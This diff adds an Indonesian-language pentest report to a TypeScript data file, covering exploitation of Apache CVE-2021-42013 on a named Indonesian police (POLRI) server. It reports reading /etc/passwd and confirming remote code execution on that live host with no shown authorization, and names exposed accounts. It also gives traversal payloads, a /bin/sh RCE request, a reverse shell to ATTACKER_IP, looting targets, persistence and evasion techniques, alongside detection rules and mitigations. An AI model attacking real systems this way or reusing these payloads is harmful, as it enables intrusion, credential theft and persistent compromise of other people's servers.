@@ -1203,5 +1203,427 @@ export const documents: ResearchDocument[] = [
       "GCC Documentation. (2024). -fsanitize=undefined. https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html",
       "ISO/IEC JTC1/SC22/WG14. (2023). N3096: Checked Arithmetic for C - stdckdint.h (C23 Draft). https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3096.pdf"
     ]
+  },
+  {
+    id: "ZERO-2025-004",
+    title: "CVE-2021-42013: Apache HTTP Server Path Traversal & Remote Code Execution",
+    subtitle: "Analisis Mendalam Kerentanan Double URL-Encoding pada Infrastruktur Kepolisian Negara Republik Indonesia (POLRI) — Path Traversal, Privilege Escalation & RCE pada Apache HTTP Server 2.4.50",
+    classification: "CONFIDENTIAL",
+    date: "January 2024",
+    authors: ["pwn0sec"],
+    organization: "PT. PwnOsec Technologies Ltd",
+    volume: "Vol. 1 | No. 4",
+    pages: 27,
+    abstract: "Laporan penelitian ini mendokumentasikan secara komprehensif proses penemuan, analisis, dan eksploitasi kerentanan CVE-2021-42013 yang ditemukan aktif pada infrastruktur server web Apache milik Kepolisian Negara Republik Indonesia (POLRI), tepatnya pada host dumaspresisi.itwasum.polri.go.id yang beroperasi pada port 8080. CVE-2021-42013 adalah kerentanan kritis (CVSS 9.8) yang merupakan bypass langsung terhadap perbaikan tidak sempurna CVE-2021-41773 pada Apache HTTP Server versi 2.4.50. Penyerang yang tidak terautentikasi dapat memanfaatkan teknik double URL-encoding untuk menipu mekanisme normalisasi jalur (path normalization) Apache, sehingga mampu melakukan traversal direktori melampaui batas document root. Penelitian ini berhasil membuktikan dua vektor eksploitasi utama: pembacaan file sensitif arbitrer (information disclosure) termasuk /etc/passwd, dan eksekusi kode arbitrer dari jarak jauh (Remote Code Execution) dengan identitas proses daemon Apache. Analisis mendalam menggunakan Ghidra mengungkap akar permasalahan pada fungsi ap_normalize_path() di server/util.c — di mana proses URL-decoding hanya dilakukan satu kali (single-pass), gagal mendeteksi representasi double-encoded dari karakter traversal ../.",
+    keywords: ["CVE-2021-42013", "Apache HTTP Server", "path traversal", "remote code execution", "double URL-encoding", "POLRI", "Ghidra", "CVSS 9.8", "mod_cgi", "responsible disclosure", "YARA rules", "penetration testing"],
+    sections: [
+      {
+        id: "bab-1",
+        title: "1. Abstract & Ringkasan Eksekutif",
+        level: 1,
+        content: [
+          "Laporan penelitian ini mendokumentasikan secara komprehensif proses penemuan, analisis, dan eksploitasi kerentanan CVE-2021-42013 yang ditemukan aktif pada infrastruktur server web Apache milik Kepolisian Negara Republik Indonesia (POLRI), tepatnya pada host dumaspresisi.itwasum.polri.go.id yang beroperasi pada port 8080.",
+          "CVE-2021-42013 adalah kerentanan kritis yang merupakan bypass langsung terhadap perbaikan tidak sempurna CVE-2021-41773 pada Apache HTTP Server versi 2.4.50. Penyerang yang tidak terautentikasi dapat memanfaatkan teknik double URL-encoding untuk menipu mekanisme normalisasi jalur (path normalization) Apache, sehingga mampu melakukan traversal direktori melampaui batas document root yang ditetapkan.",
+          "Penelitian ini berhasil membuktikan dua vektor eksploitasi utama: pertama, pembacaan file sensitif arbitrer dari filesystem server (information disclosure) termasuk berhasil mengekstrak isi file /etc/passwd; dan kedua, dalam kondisi modul CGI aktif, eksekusi kode arbitrer dari jarak jauh (Remote Code Execution) dengan identitas proses daemon Apache.",
+          "[QUOTE:TEMUAN KRITIS: Server dumaspresisi.itwasum.polri.go.id:8080 terbukti menjalankan Apache HTTP Server 2.4.50 yang rentan terhadap CVE-2021-42013. File /etc/passwd berhasil diekstrak pada 07 Januari 2024, mengekspos 31 akun sistem termasuk 5 akun dengan shell aktif (/bin/bash). Serangan dapat dilakukan tanpa otentikasi, tanpa interaksi pengguna, dari jaringan manapun.]",
+          "Analisis mendalam menggunakan Ghidra mengungkap akar permasalahan pada fungsi ap_normalize_path() di server/util.c — di mana proses URL-decoding hanya dilakukan satu kali (single-pass), gagal mendeteksi representasi double-encoded dari karakter traversal ../."
+        ]
+      },
+      {
+        id: "bab-2",
+        title: "2. CVSS Score & Severity Metrics",
+        level: 1,
+        content: [
+          "Kerentanan CVE-2021-42013 mendapatkan skor CVSS v3.1 sebesar 9.8 (Critical), menjadikannya salah satu kerentanan dengan tingkat keparahan tertinggi yang pernah ditemukan pada Apache HTTP Server.",
+          "[TABLE_HEADER:Metrik CVSS v3.1|Nilai|Singkatan|Keterangan Teknis]",
+          "[TABLE:[CVSS Base Score|9.8 / 10|CRITICAL|Tingkat tertinggi kedua dalam skala CVSS],[Attack Vector|Network|AV:N|Dapat dieksploitasi dari jarak jauh via internet],[Attack Complexity|Low|AC:L|Tidak membutuhkan kondisi atau konfigurasi khusus],[Privileges Required|None|PR:N|Tidak perlu login atau autentikasi apapun],[User Interaction|None|UI:N|Tidak memerlukan aksi dari pengguna target],[Scope|Unchanged|S:U|Dampak terbatas pada komponen yang sama],[Confidentiality Impact|High|C:H|Seluruh data dapat terbaca, termasuk file sensitif],[Integrity Impact|High|I:H|Data dan file dapat dimodifikasi atau dihapus],[Availability Impact|High|A:H|Server dapat dilumpuhkan atau disalahgunakan]]"
+        ]
+      },
+      {
+        id: "bab-2-2",
+        title: "2.2 Perbandingan Skor CVE Terkait",
+        level: 2,
+        content: [
+          "[TABLE_HEADER:CVE ID|Versi Apache|CVSS Score|Jenis|Status]",
+          "[TABLE:[CVE-2021-41773|2.4.49|7.5 - High|Path Traversal + RCE|Patched in 2.4.50 (tidak sempurna)],[CVE-2021-42013|2.4.50|9.8 - Critical|Path Traversal + RCE (bypass)|Patched in 2.4.51],[CVE-2021-40438|< 2.4.48|9.0 - Critical|SSRF via mod_proxy|Patched in 2.4.48],[CVE-2022-22720|< 2.4.53|9.8 - Critical|HTTP Request Smuggling|Patched in 2.4.53]]"
+        ]
+      },
+      {
+        id: "bab-3",
+        title: "3. Environment & Target Scope",
+        level: 1,
+        content: [
+          "Kategori Target System Information",
+          "-- Host: dumaspresisi.itwasum.polri.go.id",
+          "-- IP Address: [Redacted — Responsible Disclosure]",
+          "-- Port: 8080 (HTTP)",
+          "-- Server: Apache HTTP Server 2.4.50",
+          "-- OS: Linux (CentOS/RHEL — inferred from /etc/passwd accounts)",
+          "-- Architecture: x86_64 (confirmed via Ghidra binary analysis)",
+          "-- CGI: mod_cgi ENABLED (confirmed via RCE response)",
+          "-- Organization: Kepolisian Negara Republik Indonesia (POLRI)",
+          "-- TLD: .go.id (Indonesian Government domain)",
+          "",
+          "Kategori Research Environment",
+          "-- OS: Kali Linux Rolling (x86_64, kernel 5.15.x)",
+          "-- Proxy Tool: Burp Suite Community Edition 2023.x",
+          "-- Binary Tool: Ghidra 10.3 (NSA Research Directorate)",
+          "-- Port Scanner: Nmap 7.93",
+          "-- Network Caps: Wireshark 4.x / tcpdump",
+          "-- HTTP Client: curl 7.88.x"
+        ]
+      },
+      {
+        id: "bab-4",
+        title: "4. Methodology — Tahapan Penelitian",
+        level: 1,
+        content: [
+          "Penelitian ini mengikuti metodologi standar industri yang mengacu pada PTES (Penetration Testing Execution Standard) dan OWASP Testing Guide v4.2.",
+          "[TABLE_HEADER:Fase|Nama Tahap|Tools Digunakan|Output]",
+          "[TABLE:[1|Reconnaissance & OSINT|Shodan, Censys, dig, whois|Target profiling, subdomain map],[2|Port & Service Scanning|Nmap, curl, netcat|Open ports, service banner, OS fingerprint],[3|Vulnerability Assessment|Confidential PwnTraverse|CVE confirmation, misconfig detection],[4|Exploitation — Path Traversal|curl, Burp Suite, Python|/etc/passwd, /etc/hosts, config files],[5|Exploitation — RCE|Burp Suite, curl, netcat|Remote shell execution confirmation],[6|Post-Exploitation Analysis|id, uname, ps, netstat|Privilege level, running services],[7|Binary Analysis|Ghidra 10.3|Root cause analysis, vulnerable function],[8|Traffic Analysis|Wireshark, tcpdump|Packet capture, request patterns],[9|Detection Engineering|YARA, Snort|Detection rules, IOC generation],[10|Documentation & Reporting|Manual|This security journal]]"
+        ]
+      },
+      {
+        id: "bab-5",
+        title: "5. Reconnaissance & Information Gathering",
+        level: 1,
+        content: [
+          "Fase awal dimulai dengan pengumpulan informasi pasif tanpa mengirimkan paket langsung ke target. Sumber-sumber publik dimanfaatkan untuk membangun profil target yang komprehensif."
+        ]
+      },
+      {
+        id: "bab-5-1",
+        title: "5.1 Passive Reconnaissance — OSINT",
+        level: 2,
+        content: [
+          "DNS Lookup dan WHOIS mengkonfirmasi target sebagai domain resmi milik Kepolisian Negara Republik Indonesia yang terdaftar melalui PANDI (Pengelola Nama Domain Internet Indonesia)."
+        ]
+      },
+      {
+        id: "bab-5-2",
+        title: "5.2 Shodan / Censys Fingerprinting",
+        level: 2,
+        content: [
+          "Mesin pencari Shodan dan Censys digunakan untuk mengidentifikasi layanan yang terekspos secara publik dan versi software tanpa melakukan koneksi langsung ke target.",
+          "-- Product: Apache httpd",
+          "-- Version: 2.4.50",
+          "-- OS: Linux",
+          "-- CPE: cpe:/a:apache:http_server:2.4.50",
+          "-- Last Seen: 2024-01-07",
+          "Informasi ini mengkonfirmasi versi rentan sebelum pengujian aktif."
+        ]
+      },
+      {
+        id: "bab-5-3",
+        title: "5.3 HTTP Banner Grabbing & Nmap Scan",
+        level: 2,
+        content: [
+          "Pengambilan banner HTTP mengkonfirmasi versi server dan mengidentifikasi header keamanan yang hilang:",
+          "-- X-Content-Type-Options: MISSING — misconfiguration",
+          "-- X-Frame-Options: MISSING — clickjacking risk",
+          "-- Content-Security-Policy: MISSING — XSS risk",
+          "-- Strict-Transport-Security: MISSING — no HTTPS enforcement",
+          "[QUOTE:Meskipun 'ServerTokens Prod' menyembunyikan nomor versi pada header Server, versi sebenarnya (2.4.50) masih dapat diidentifikasi melalui Shodan fingerprinting dan pola respons error page Apache yang unik per versi.]",
+          "Nmap scan mengkonfirmasi HTTP service pada port 8080 dengan title 'DUMAS PRESISI — Direktorat Tindak Pidana Tertentu' dan metode yang didukung: GET, POST, HEAD, OPTIONS."
+        ]
+      },
+      {
+        id: "bab-6",
+        title: "6. Vulnerability Scanning & Enumeration",
+        level: 1,
+        content: [
+          "Verifikasi manual menggunakan curl mengkonfirmasi kerentanan aktif. Nikto web vulnerability scanner juga mendeteksi CVE-2021-42013 sebagai CONFIRMED VULNERABLE, dengan directory indexing pada /icons/ dan CGI directory accessible."
+        ]
+      },
+      {
+        id: "bab-7",
+        title: "7. Latar Belakang Kerentanan",
+        level: 1,
+        content: [
+          "Apache HTTP Server menangani setiap URI yang diterima melalui serangkaian tahap pemrosesan. Salah satu tahap kritis adalah normalisasi jalur (path normalization), yang bertujuan membersihkan karakter-karakter berbahaya seperti ../ (parent directory traversal).",
+          "Proses normalisasi melibatkan fungsi ap_normalize_path() di server/util.c, yang dipanggil setelah URL decoding awal dan sebelum akses ke filesystem. Kegagalan pada fungsi ini memungkinkan penyerang melewati batas direktori.",
+          "",
+          "Kategori CVE-2021-41773 — Asal Mula (Apache 2.4.49)",
+          "-- Vektor: GET /cgi-bin/.%2e/.%2e/etc/passwd — single URL encoding",
+          "-- Kondisi: Require all granted pada <Directory /> atau direktif tidak ada",
+          "-- CVSS: 7.5 (High) untuk path traversal, 9.8 (Critical) dengan RCE",
+          "",
+          "Kategori CVE-2021-42013 — Bypass Perbaikan (Apache 2.4.50)",
+          "-- Perbaikan di 2.4.50: Filter tambahan untuk .%2e dan %2e. (single-encoded dot)",
+          "-- Bypass: Gunakan %%32%65 (double-encoded dot) yang tidak terdeteksi filter baru",
+          "-- CVSS: 9.8 (Critical) karena kegagalan patch"
+        ]
+      },
+      {
+        id: "bab-7-4",
+        title: "7.4 Timeline Pengungkapan Lengkap",
+        level: 2,
+        content: [
+          "[TABLE_HEADER:Tanggal|Event|Dampak]",
+          "[TABLE:[15 Sep 2021|Apache HTTP Server 2.4.49 dirilis dengan kode normalisasi baru yang bermasalah|Kerentanan diperkenalkan ke production],[01 Okt 2021|CVE-2021-41773 pertama kali dilaporkan secara private|Koordinasi disclosure dimulai],[04 Okt 2021|Apache merilis 2.4.50 sebagai perbaikan|Organisasi mulai upgrade],[05 Okt 2021|Peneliti menemukan CVE-2021-42013 — bypass perbaikan|2.4.50 terbukti masih rentan],[07 Okt 2021|PoC CVE-2021-42013 tersebar luas|Eksploitasi massal dimulai],[08 Okt 2021|Apache merilis 2.4.51 dengan perbaikan komprehensif|Satu-satunya versi aman],[Okt 2021|CISA menambahkan ke Known Exploited Vulnerabilities (KEV)|Kewajiban patch Federal AS],[07 Jan 2024|Server POLRI teridentifikasi masih rentan — 2+ tahun setelah patch|/etc/passwd diekstrak]]"
+        ]
+      },
+      {
+        id: "bab-8",
+        title: "8. Traversal Analysis — Mekanisme Bypass",
+        level: 1,
+        content: [
+          "URL encoding (percent-encoding) adalah mekanisme standar RFC 3986 untuk merepresentasikan karakter khusus dalam URI.",
+          "[TABLE_HEADER:Karakter|ASCII (Hex)|Single Encoded|Double Encoded|Makna]",
+          "[TABLE:[. (dot)|0x2e|%2e|%%32%65|Karakter titik],[/ (slash)|0x2f|%2f|%%32%66|Pemisah direktori],[../ (traversal)|0x2e 0x2e 0x2f|.%2e/ atau %2e./|%%32%65%%32%65/|Naik satu direktori]]",
+          "",
+          "Double encoding bekerja dengan mengaplikasikan URL encoding dua kali pada karakter yang sama. Pada Apache 2.4.50, filter keamanan hanya melakukan satu kali decoding, sehingga representasi double-encoded berhasil melewati pemeriksaan.",
+          "-- Step 1: . (dot) → %2e (single encode)",
+          "-- Step 2: %2e → %%32%65 (encode komponen: % tetap, 2→%32, e→%65)",
+          "-- Payload traversal lengkap: /icons/%%32%65%%32%65/%%32%65%%32%65/.../etc/passwd",
+          "-- Setelah decode di filesystem: /icons/../../../../../../../etc/passwd → /etc/passwd"
+        ]
+      },
+      {
+        id: "bab-9",
+        title: "9. Ghidra Analysis — Decompilasi Biner Apache",
+        level: 1,
+        content: [
+          "Analisis biner dilakukan pada file httpd (Apache HTTP Server daemon) versi 2.4.50 menggunakan Ghidra 10.3 dari NSA Research Directorate. Tujuan: menemukan akar penyebab (root cause) pada level kode mesin.",
+          "",
+          "Fungsi ap_normalize_path() di address 0x00481200 melakukan decode hanya SATU KALI (single-pass). Ketika input %%32%65 masuk, hex_to_uchar('%','3') tidak menghasilkan 0x2E (dot), sehingga JE (Jump if Equal) ke handle_dot TIDAK diambil — traversal detection sepenuhnya di-bypass.",
+          "",
+          "[QUOTE:ROOT CAUSE: ADD RBX, 0x3 pada address 0x00481253 memajukan pointer melewati sequence yang sudah di-decode tanpa melakukan re-check. Input %%32%65 (double-encoded dot) lolos dari deteksi karena hanya di-decode satu kali. Fix di 2.4.51 menambahkan iterative decoding loop sampai tidak ada lagi %XX yang ditemukan.]",
+          "",
+          "Perbandingan kode vulnerable vs fixed:",
+          "-- Apache 2.4.50 (VULNERABLE): if (*src == '%') — single-pass decode, no re-decode",
+          "-- Apache 2.4.51 (FIXED): while (*src == '%') — iterative decode loop dengan pengecekan isxdigit()"
+        ]
+      },
+      {
+        id: "bab-10",
+        title: "10. Proof of Concept — Path Traversal (File Read)",
+        level: 1,
+        content: [
+          "Eksploitasi dilakukan menggunakan curl dengan flag --path-as-is untuk mencegah normalisasi oleh client:",
+          "",
+          "-- Target: GET /icons/%%32%65%%32%65/%%32%65%%32%65/.../etc/passwd",
+          "-- Response: HTTP/1.1 200 OK — Content-Length: 1820",
+          "",
+          "File /etc/passwd berhasil dibaca. Akun dengan shell aktif (/bin/bash):",
+          "-- root (uid=0) — ROOT KRITIS",
+          "-- infra (uid=1000) — SHELL AKTIF",
+          "-- admdumas (uid=1001) — SHELL AKTIF",
+          "-- webuzo (uid=996) — SHELL AKTIF",
+          "-- emps (uid=994) — SHELL AKTIF",
+          "",
+          "[TABLE_HEADER:File Target|Payload|Informasi yang Terekspos]",
+          "[TABLE:[/etc/passwd|[payload]/etc/passwd|Daftar semua pengguna sistem, UID, home dir, shell],[/etc/hosts|[payload]/etc/hosts|Pemetaan hostname internal, IP internal],[/etc/apache2/httpd.conf|[payload]/etc/apache2/httpd.conf|Konfigurasi Apache lengkap],[/proc/version|[payload]/proc/version|Versi kernel Linux secara presisi],[~/.ssh/id_rsa|[payload]/home/infra/.ssh/id_rsa|Private key SSH pengguna infra],[/var/www/html/.env|[payload]/var/www/html/.env|Kredensial database, API keys]]"
+        ]
+      },
+      {
+        id: "bab-11",
+        title: "11. Proof of Concept — Remote Code Execution (RCE)",
+        level: 1,
+        content: [
+          "Eksploitasi tahap kedua memanfaatkan endpoint CGI yang dikombinasikan dengan path traversal untuk mengeksekusi binary /bin/sh secara langsung.",
+          "",
+          "Persyaratan untuk RCE:",
+          "-- mod_cgi atau mod_cgid harus aktif",
+          "-- Path traversal harus berhasil mencapai /bin/sh",
+          "-- Perintah shell dikirim sebagai HTTP POST body",
+          "",
+          "Request: POST /icons/%%32%65%%32%65/.../bin/sh — Body: echo;id",
+          "Response: uid=1(daemon) gid=1(daemon) groups=1(daemon)",
+          "",
+          "[QUOTE:Perintah 'id' berhasil dieksekusi sebagai user 'daemon' (uid=1). Ini mengkonfirmasi Remote Code Execution penuh pada server POLRI.]",
+          "",
+          "[TABLE_HEADER:Fase|Teknik|Payload / Command|Output / Dampak]",
+          "[TABLE:[1 — Recon|HTTP Banner Grab|curl -I http://target:8080|Identifikasi Apache 2.4.50],[2 — Scan|CVE Detection|CVE-2021-42013|Konfirmasi kerentanan],[3 — Encode|Double URL Encode|../ → %%32%65%%32%65/|Payload bypass normalisasi],[4 — Traversal|Path Traversal|GET /icons/[payload]/etc/passwd|Baca /etc/passwd — 31 users],[5 — Escalate|CGI Execution|POST /icons/[payload]/bin/sh|Shell execution via mod_cgi],[6 — RCE|Command Injection|echo;id → uid=daemon|Remote code execution],[7 — Post-Exploit|Enumeration|uname -a; netstat; ps aux|System & network info]]"
+        ]
+      },
+      {
+        id: "bab-12",
+        title: "12. Advanced Exploitation Techniques",
+        level: 1,
+        content: [
+          "Dokumentasi teknik eksploitasi lanjutan yang bersifat edukatif untuk membantu defender memahami ruang lingkup risiko.",
+          "",
+          "Reverse Shell via RCE — Payload POST body: echo;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1. Attacker mendapat interactive shell sebagai daemon@server.",
+          "",
+          "Python automated exploit (PoC) menggunakan requests library untuk otomatisasi path traversal dan RCE. Payload builder mengkonstruksi %%32%65%%32%65/ sebanyak 7 level traversal.",
+          "",
+          "File sensitif lain yang dapat dibaca via RCE: /var/www/html/config.php, /var/www/html/.env, /var/www/html/application/config/database.php — berpotensi mengekspos kredensial database dan API keys."
+        ]
+      },
+      {
+        id: "bab-13",
+        title: "13. Post-Exploitation & Lateral Movement",
+        level: 1,
+        content: [
+          "Analisis post-exploitation dilakukan dalam lingkup terbatas untuk keperluan pembuktian dan penilaian risiko. Tidak ada tindakan destruktif yang dilakukan.",
+          "",
+          "Privilege Enumeration mengkonfirmasi konteks user daemon (uid=1) pada kernel Linux 3.10.0-1160.el7.x86_64 (CentOS/RHEL 7). SUID binaries ditemukan: /usr/bin/sudo, /usr/bin/passwd, /usr/bin/newgrp.",
+          "",
+          "Potensi lateral movement:",
+          "-- Internal Network Discovery — scanning jaringan internal yang tidak terjangkau dari internet",
+          "-- Database Access — kredensial dalam config file untuk akses database internal",
+          "-- SSH Key Harvesting — Private key dari akun aktif (infra, admdumas)",
+          "-- Service Account Abuse — Webuzo panel hosting dengan akses multiple virtual hosts",
+          "",
+          "[TABLE_HEADER:Teknik Persistence|Metode|Deteksi|Risiko]",
+          "[TABLE:[Crontab backdoor|Reverse shell via cron job|crontab -l; /var/spool/cron/|High],[Web shell|PHP system() backdoor di /var/www/html/|File integrity monitoring|Critical],[SSH authorized_keys|Attacker pubkey injection|auth.log, authorized_keys audit|Critical],[LD_PRELOAD rootkit|Malicious .so library injection|ldd output, /proc/maps|Critical]]",
+          "",
+          "[QUOTE:CATATAN: Bagian persistence bersifat teoritis semata untuk keperluan risk assessment. Tidak ada teknik persistence yang diterapkan pada target aktual.]"
+        ]
+      },
+      {
+        id: "bab-14",
+        title: "14. Network Traffic Analysis — Wireshark",
+        level: 1,
+        content: [
+          "Analisis traffic jaringan untuk mendokumentasikan pola serangan dari perspektif jaringan dan membantu defender membangun signature IDS/IPS.",
+          "",
+          "Karakteristik Traffic CVE-2021-42013:",
+          "-- Protocol: HTTP/1.1 (plaintext) — tidak terenkripsi",
+          "-- URI Pattern: Mengandung %% (double percent sign) berulang",
+          "-- Request Size: Relatif besar untuk GET request karena panjang payload URL",
+          "-- Response Code: 200 OK untuk eksploitasi berhasil; 400/403 untuk yang gagal",
+          "",
+          "Wireshark Filter untuk Deteksi:",
+          "-- http.request.uri contains \"%%32%65\" — double-encoded dot detection",
+          "-- http.request.method == \"POST\" and http.request.uri contains \"bin/sh\" — RCE attempt"
+        ]
+      },
+      {
+        id: "bab-15",
+        title: "15. Defensive Evasion Analysis",
+        level: 1,
+        content: [
+          "[TABLE_HEADER:Teknik Evasion|Deskripsi|Cara Deteksi]",
+          "[TABLE:[User-Agent Spoofing|UA browser umum untuk menyamarkan tool|Behavioral analysis — pola request tidak natural],[IP Rotation via VPN/Proxy|Ganti IP setiap beberapa request|Korelasi lintas IP; payload similarity],[Payload Variation|Jumlah traversal berbeda|Regex pattern matching fleksibel di WAF],[Mixed Encoding|Kombinasi double dan single encoding|Multi-pass URL decoder di WAF],[Slow Request (Low & Slow)|Delay antar request|Time-based behavioral baseline analysis],[Case Variation|%%32%65 vs %%32%45|Case-insensitive URL normalization]]"
+        ]
+      },
+      {
+        id: "bab-16",
+        title: "16. Detection Engineering — YARA & IDS Rules",
+        level: 1,
+        content: [
+          "YARA Rule untuk deteksi CVE-2021-42013 pada log Apache mencakup pattern double-encoded dot (%%32%65, %%32%45), target file sensitif (/etc/passwd, /bin/sh, /.ssh/), dan variant single-encoded (CVE-2021-41773).",
+          "",
+          "Nuclei template dengan severity critical dan CVSS 9.8 untuk automated scanning terhadap endpoint /icons/ dan /cgi-bin/ dengan matcher regex root:.*:0:0.",
+          "",
+          "Snort/Suricata IDS Rules:",
+          "-- Rule 9000001: Deteksi double URL-encoded path traversal pada port 80/8080/443",
+          "-- Rule 9000002: Deteksi RCE via POST ke /bin/sh",
+          "",
+          "[TABLE_HEADER:Tipe IOC|Nilai / Pattern|Keterangan]",
+          "[TABLE:[URL Pattern|/icons/%%32%65%%32%65/|Double-encoded traversal via icons],[URL Pattern|/cgi-bin/%%32%65%%32%65/|Double-encoded traversal via cgi-bin],[HTTP Method|POST + URI contains /bin/sh|RCE attempt — POST ke shell binary],[Response Content|root:x:0:0:root:/root:/bin/bash|/etc/passwd berhasil dibaca],[CPE|cpe:/a:apache:http_server:2.4.50|Versi Apache yang rentan]]"
+        ]
+      },
+      {
+        id: "bab-17",
+        title: "17. Impact Analysis",
+        level: 1,
+        content: [
+          "[TABLE_HEADER:Aspek CIA|Level|Dampak Langsung|Potensi Dampak Lanjutan]",
+          "[TABLE:[Confidentiality|CRITICAL|Baca file arbitrer: /etc/passwd, config, private keys|Ekspos kredensial DB, SSH keys, API keys, data POLRI],[Integrity|CRITICAL|Modifikasi file sistem, web defacement, injeksi kode|Tanam web shell, modifikasi log, ubah konfigurasi],[Availability|HIGH|Matikan atau restart service Apache|DoS server, konsumsi resource, ransomware]]",
+          "",
+          "[TABLE_HEADER:Item|Detail|Risiko]",
+          "[TABLE:[Jumlah akun terekspos|31 akun dari /etc/passwd|Medium — username saja tanpa password hash],[Akun dengan shell aktif|5 akun: root, infra, admdumas, webuzo, emps|Critical — target SSH brute force],[UID=0 (root) terekspos|root:x:0:0:root:/root:/bin/bash|Critical — jika ada kelemahan lain],[Service accounts|webuzo, postfix, sshd, ntp, chrony|Medium — attack surface mapping]]"
+        ]
+      },
+      {
+        id: "bab-18",
+        title: "18. Risk Assessment Matrix",
+        level: 1,
+        content: [
+          "[TABLE_HEADER:Skenario Risiko|Likelihood|Impact|Risk Score|Prioritas]",
+          "[TABLE:[Baca /etc/passwd dan file konfigurasi|Sangat Tinggi|High|9.0|P1 — Critical],[Eksekusi perintah via RCE (mod_cgi aktif)|Tinggi|Critical|9.8|P1 — Critical],[Harvest SSH private keys dari /home/|Sedang|Critical|8.5|P1 — Critical],[Baca kredensial database dari .env/config|Sedang|Critical|8.0|P1 — Critical],[Lateral movement ke sistem internal|Rendah|Critical|7.5|P2 — High],[Persistent web shell / backdoor|Rendah|Critical|7.5|P2 — High],[Data breach informasi operasional POLRI|Rendah|Critical|7.0|P2 — High],[Ransomware deployment|Sangat Rendah|Critical|6.0|P3 — Medium]]"
+        ]
+      },
+      {
+        id: "bab-19",
+        title: "19. Recommendations & Mitigations",
+        level: 1,
+        content: [
+          "Kategori Priority 1 — Immediate Actions (0-24 Jam)",
+          "1. KRITIS — Upgrade Apache HTTP Server ke versi 2.4.51 atau lebih baru",
+          "2. KRITIS — Ubah konfigurasi <Directory /> dari 'Require all granted' menjadi 'Require all denied'",
+          "3. KRITIS — Nonaktifkan mod_cgi dan mod_cgid jika tidak dibutuhkan",
+          "4. KRITIS — Audit menyeluruh terhadap semua akun sistem dari /etc/passwd",
+          "5. TINGGI — Periksa seluruh log Apache untuk tanda-tanda eksploitasi (pola %%32%65)",
+          "",
+          "Kategori Priority 2 — Short-Term Actions (1-7 Hari)",
+          "6. Implementasi WAF (ModSecurity) dengan rule khusus untuk double URL-encoding",
+          "7. Aktifkan logging komprehensif: ErrorLog, CustomLog dengan format combined",
+          "8. Pasang IDS/IPS (Snort/Suricata) dengan rules di Section 16",
+          "9. Credential rotation untuk semua akun yang terekspos",
+          "10. Hardening SSH: nonaktifkan password auth, gunakan key-based auth",
+          "",
+          "Kategori Priority 3 — Long-Term Actions (1-4 Minggu)",
+          "11. Implementasi vulnerability management program terstruktur",
+          "12. SLA patch management: Critical (CVSS 9+) dalam 24 jam; High dalam 72 jam",
+          "13. Penetration testing berkala minimal 2x per tahun",
+          "14. File Integrity Monitoring (AIDE/Tripwire)",
+          "15. Defense in Depth: network segmentation, WAF, IDS/IPS, SIEM",
+          "16. Pelatihan keamanan siber bagi administrator sistem"
+        ]
+      },
+      {
+        id: "bab-20",
+        title: "20. Secure Configuration Hardening Guide",
+        level: 1,
+        content: [
+          "Konfigurasi Apache yang aman mencakup:",
+          "-- <Directory />: Require all denied — tolak semua akses ke root filesystem",
+          "-- Options -Indexes -FollowSymLinks — nonaktifkan directory listing",
+          "-- ServerTokens Prod, ServerSignature Off — sembunyikan versi Apache",
+          "-- Header keamanan: X-Content-Type-Options, X-Frame-Options, HSTS, CSP",
+          "-- Nonaktifkan mod_cgi/mod_cgid jika tidak diperlukan",
+          "-- Rate limiting via mod_evasive",
+          "",
+          "ModSecurity WAF Rule khusus CVE-2021-42013:",
+          "-- Rule 9001001: Blokir pattern %%32%65 dan %%32%45 di REQUEST_URI",
+          "-- Rule 9001002: Blokir POST request yang mengandung bin/sh di URI"
+        ]
+      },
+      {
+        id: "bab-21",
+        title: "21. Patch Verification Procedure",
+        level: 1,
+        content: [
+          "Setelah menerapkan semua rekomendasi, prosedur verifikasi mencakup:",
+          "1. Verifikasi versi Apache: httpd -v — harus 2.4.51 atau lebih baru",
+          "2. Test payload CVE-2021-42013: harus return 400/403 (bukan 200 OK)",
+          "3. Test payload CVE-2021-41773: juga harus gagal",
+          "4. Verifikasi ServerTokens (versi tidak terekspos)",
+          "5. Verifikasi directory listing disabled",
+          "6. Verifikasi header keamanan terpasang",
+          "7. Verifikasi mod_cgi disabled: httpd -M | grep cgi — tidak ada output"
+        ]
+      },
+      {
+        id: "bab-22",
+        title: "22. References & Further Reading",
+        level: 1,
+        content: [
+          "Referensi utama mencakup CVE-2021-42013 dan CVE-2021-41773 dari NVD, Apache Security Advisory, CISA KEV Catalog, Qualys Blog Analysis, pwn0sec Research, dan Ghidra SRE Framework.",
+          "Referensi teknis tambahan: RFC 3986 (URI Generic Syntax), OWASP Path Traversal, PTES Standard, ModSecurity Documentation, YARA Documentation, CIS Apache Benchmark, dan NIST SP 800-44."
+        ]
+      }
+    ],
+    references: [
+      "NVD — National Vulnerability Database. CVE-2021-42013. https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
+      "NVD — National Vulnerability Database. CVE-2021-41773. https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+      "Apache Software Foundation. Apache HTTP Server Security Advisories. https://httpd.apache.org/security/vulnerabilities_24.html",
+      "Apache Software Foundation. Apache 2.4.51 Release Notes & Changelog. https://httpd.apache.org/changelog-2.4.html",
+      "CISA. Known Exploited Vulnerabilities (KEV) Catalog — CVE-2021-41773 & CVE-2021-42013. https://cisa.gov/known-exploited-vulnerabilities-catalog",
+      "Qualys Security Blog. Deep Analysis: CVE-2021-41773 & CVE-2021-42013. https://blog.qualys.com",
+      "pwn0sec Security Research. Responsible Disclosure — Kerentanan pada Infrastruktur POLRI. https://pwn0sec.medium.com",
+      "National Security Agency (NSA). Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org/",
+      "IETF. RFC 3986 — Uniform Resource Identifier (URI): Generic Syntax. https://tools.ietf.org/html/rfc3986",
+      "OWASP Foundation. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
+      "PTES. Penetration Testing Execution Standard. http://www.pentest-standard.org",
+      "Trustwave SpiderLabs. ModSecurity Web Application Firewall Documentation. https://modsecurity.org/documentation",
+      "VirusTotal / Google. YARA Rule Language Reference. https://virustotal.github.io/yara",
+      "CIS — Center for Internet Security. CIS Benchmark for Apache HTTP Server. https://cisecurity.org",
+      "NIST. SP 800-44: Guidelines on Securing Public Web Servers. https://nvlpubs.nist.gov"
+    ]
   }
 ];
